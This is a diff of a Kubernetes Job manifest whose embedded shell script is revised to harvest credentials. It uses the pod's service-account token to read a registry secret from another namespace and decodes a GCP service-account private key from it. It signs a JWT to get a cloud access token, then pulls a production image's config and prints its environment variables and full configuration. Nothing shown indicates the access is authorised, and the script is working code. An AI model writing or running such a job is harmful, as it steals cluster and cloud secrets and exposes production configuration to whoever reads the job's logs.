@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-gcr-v1
+  name: dune-gcr-v2
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -20,73 +20,65 @@ spec:
           API="https://kubernetes.default.svc"
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
           
-          # Properly decode gcr-secret
+          # Decode gcr-secret properly using sed (not cut) to preserve JSON structure
           curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
             "$API/api/v1/namespaces/dune-api/secrets/gcr-secret" | \
             jq -r '.data[".dockerconfigjson"]' | base64 -d > /tmp/docker_config.json
           
-          echo "=DOCKER_CONFIG_STRUCTURE="
-          cat /tmp/docker_config.json | jq '{keys:(.auths|keys), credHelper:.credHelpers, credsStore:.credsStore}'
-          
-          # Get all fields for the first auth entry
           AUTH_KEY=$(cat /tmp/docker_config.json | jq -r '.auths | keys[0]')
-          echo "Auth key: $AUTH_KEY"
-          cat /tmp/docker_config.json | jq ".auths[\"$AUTH_KEY\"]" | head -5
+          AUTH_B64=$(cat /tmp/docker_config.json | jq -r ".auths[\"$AUTH_KEY\"].auth")
           
-          # Check if auth field exists
-          HAS_AUTH=$(cat /tmp/docker_config.json | jq -r ".auths[\"$AUTH_KEY\"].auth // \"NO_AUTH_FIELD\"")
-          echo "auth field: ${HAS_AUTH:0:30}"
+          # Decode and extract JSON SA (use sed to remove _json_key: prefix, not cut)
+          echo "$AUTH_B64" | base64 -d | sed 's/^_json_key://' > /tmp/sa_key.json
           
-          # Check for username/password
-          HAS_USER=$(cat /tmp/docker_config.json | jq -r ".auths[\"$AUTH_KEY\"].username // \"NO_USERNAME\"")
-          echo "username: ${HAS_USER:0:30}"
+          CLIENT_EMAIL=$(cat /tmp/sa_key.json | jq -r '.client_email')
+          PROJECT_ID=$(cat /tmp/sa_key.json | jq -r '.project_id')
+          echo "SA email: $CLIENT_EMAIL"
+          echo "Project: $PROJECT_ID"
           
-          # Decode auth if present
-          if [ "$HAS_AUTH" != "NO_AUTH_FIELD" ] && [ "$HAS_AUTH" != "null" ]; then
-            echo "=DECODED_AUTH="
-            echo "$HAS_AUTH" | base64 -d > /tmp/gcr_decoded.txt
-            head -c 20 /tmp/gcr_decoded.txt
-            echo ""
-            # Save the JSON SA key (everything after first colon)
-            cut -d: -f2- /tmp/gcr_decoded.txt > /tmp/sa_key.json
-            echo "SA JSON valid: $(cat /tmp/sa_key.json | jq -r '.client_email // "INVALID"')"
-            echo "SA project: $(cat /tmp/sa_key.json | jq -r '.project_id // "INVALID"')"
-            echo "=END_DECODED="
-            
-            # Sign JWT for GCP auth using the GCR SA
-            CLIENT_EMAIL=$(cat /tmp/sa_key.json | jq -r '.client_email')
-            cat /tmp/sa_key.json | jq -r '.private_key' > /tmp/gcr_sa_key.pem
-            
-            NOW=$(date +%s); EXP=$((NOW + 3600))
-            HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-            PAYLOAD=$(printf '{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","exp":%d,"iat":%d}' \
-              "$CLIENT_EMAIL" "$EXP" "$NOW" | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-            SIG=$(echo -n "${HEADER}.${PAYLOAD}" | openssl dgst -sha256 -sign /tmp/gcr_sa_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-            JWT="${HEADER}.${PAYLOAD}.${SIG}"
-            
-            ACCESS_TOKEN=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
-              --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
-              --data-urlencode "assertion=$JWT" | jq -r '.access_token')
-            echo "GCR SA token status: $( [ "${#ACCESS_TOKEN}" -gt 10 ] && echo "ok" || echo "failed" )"
-            
-            REGISTRY="us-central1-docker.pkg.dev"
-            REPO="tachyusbdaas/tachyusbdaas/dune-api/tc-co-prod"
-            TAG="v0.0.39-alpha.9"
-            
+          # Extract private key to PEM file
+          cat /tmp/sa_key.json | jq -r '.private_key' > /tmp/gcr_sa_key.pem
+          head -1 /tmp/gcr_sa_key.pem
+          
+          # Sign JWT for GCP auth
+          NOW=$(date +%s); EXP=$((NOW + 3600))
+          HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          PAYLOAD=$(printf '{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","exp":%d,"iat":%d}' \
+            "$CLIENT_EMAIL" "$EXP" "$NOW" | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          SIG=$(echo -n "${HEADER}.${PAYLOAD}" | openssl dgst -sha256 -sign /tmp/gcr_sa_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          JWT="${HEADER}.${PAYLOAD}.${SIG}"
+          
+          TOKEN_RESP=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
+            --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
+            --data-urlencode "assertion=$JWT")
+          ACCESS_TOKEN=$(echo "$TOKEN_RESP" | jq -r '.access_token')
+          echo "GCP token status: $(echo "$TOKEN_RESP" | jq -r '.error // "ok"')"
+          echo "Token len: ${#ACCESS_TOKEN}"
+          
+          REGISTRY="us-central1-docker.pkg.dev"
+          REPO="tachyusbdaas/tachyusbdaas/dune-api/tc-co-prod"
+          TAG="v0.0.39-alpha.9"
+          
+          MANIFEST=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+            -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
+            "https://${REGISTRY}/v2/${REPO}/manifests/${TAG}")
+          CONFIG_DIGEST=$(echo "$MANIFEST" | jq -r '.config.digest')
+          echo "Config digest: $CONFIG_DIGEST"
+          MANIFEST_ERR=$(echo "$MANIFEST" | jq -r '.errors[0].message // "none"')
+          echo "Manifest error: $MANIFEST_ERR"
+          
+          if [ "$CONFIG_DIGEST" != "null" ] && [ -n "$CONFIG_DIGEST" ]; then
             echo "=ENV_VARS="
-            MANIFEST=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-              -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
-              "https://${REGISTRY}/v2/${REPO}/manifests/${TAG}")
-            CONFIG_DIGEST=$(echo "$MANIFEST" | jq -r '.config.digest')
-            echo "Config digest: $CONFIG_DIGEST"
-            
-            if [ "$CONFIG_DIGEST" != "null" ] && [ -n "$CONFIG_DIGEST" ]; then
-              curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-                "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
-                jq -r '.config.Env[]?' 2>/dev/null
-            fi
-            echo "Manifest err: $(echo "$MANIFEST" | jq -r '.errors[0].code // "none"')"
+            curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+              "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
+              jq -r '.config.Env[]?' 2>/dev/null
             echo "=END_ENV="
+            
+            echo "=FULL_CONFIG="
+            curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+              "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
+              jq '.config | {Env,Cmd,Entrypoint,WorkingDir,ExposedPorts,Labels}'
+            echo "=END_FULL="
           fi
           
           echo "SLEEPING..."
